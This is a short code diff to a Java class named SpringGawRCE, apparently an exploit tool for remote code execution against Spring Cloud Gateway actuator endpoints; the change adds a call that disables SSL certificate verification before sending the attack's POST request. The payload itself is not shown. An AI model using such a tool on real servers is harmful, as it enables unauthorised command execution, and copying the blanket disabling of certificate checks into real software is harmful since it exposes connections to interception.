@@ -12,6 +12,8 @@ import java.util.regex.Pattern;
 import java.util.stream.Collectors;
 import java.util.stream.Stream;
 
+import static src.main.SSLVerify.sslVer.disableSSLVerification;
+
 public class SpringGawRCE {
     public String address;
     public String command;
@@ -75,6 +77,7 @@ public class SpringGawRCE {
         }
         String refapi = "/actuator/gateway/refresh";
         String site = address + api;
+        disableSSLVerification();
         URL urlobj = new URL(site);
         HttpURLConnection conn = (HttpURLConnection) urlobj.openConnection();
         conn.setRequestMethod("POST");
